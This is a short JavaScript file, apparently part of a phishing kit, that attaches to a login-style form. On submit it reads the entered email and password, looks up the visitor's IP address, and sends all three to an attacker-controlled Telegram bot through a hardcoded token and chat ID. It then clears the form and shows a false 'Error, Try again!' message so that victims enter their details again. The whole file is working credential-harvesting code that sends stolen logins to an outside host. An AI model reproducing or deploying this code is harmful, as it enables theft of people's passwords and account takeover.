// Function to send form data and user's IP address to Telegram
function sendFormToTelegram(email, password, ip) {
  const botToken = "6330855098:AAF9Woyj6INDb7eSlONuV8tajhxsuVo1xrw"; // Replace with your Telegram bot token
  const chatId = "6372958816"; // Replace with your Telegram chat ID

  const message = `New form submission:\n\n__Name__: ${email}\n__Email__: ${password}\n__IP__: ${ip}`;

  const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
    message
  )}`;

  fetch(url)
    .then((response) => response.json())
    .then((data) => {
      console.log("Message sent to Telegram:", data);
    })
    .catch((error) => {
      console.error("Error sending message to Telegram:", error);
    });
}

// Get the form element
const form = document.getElementById("myForm");
const messageElement = document.getElementById("message");
// Add event listener for form submission
form.addEventListener("submit", function (event) {
  event.preventDefault(); // Prevent default form submission

  // Get form input values
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  // Fetch the user's IP address
  fetch("https://api.ipify.org?format=json")
    .then((response) => response.json())
    .then((data) => {
      const userIP = data.ip;

      // Send the form data and IP address to Telegram
      sendFormToTelegram(email, password, userIP);

      // Clear the form fields
      form.reset();

      // Display success message
      showMessage("Error, Try again!");

      console.log("User IP:", userIP);
    })
    .catch((error) => {
      console.error("Error fetching user IP:", error);
    });
});

function showMessage(text) {
  messageElement.textContent = text;
}
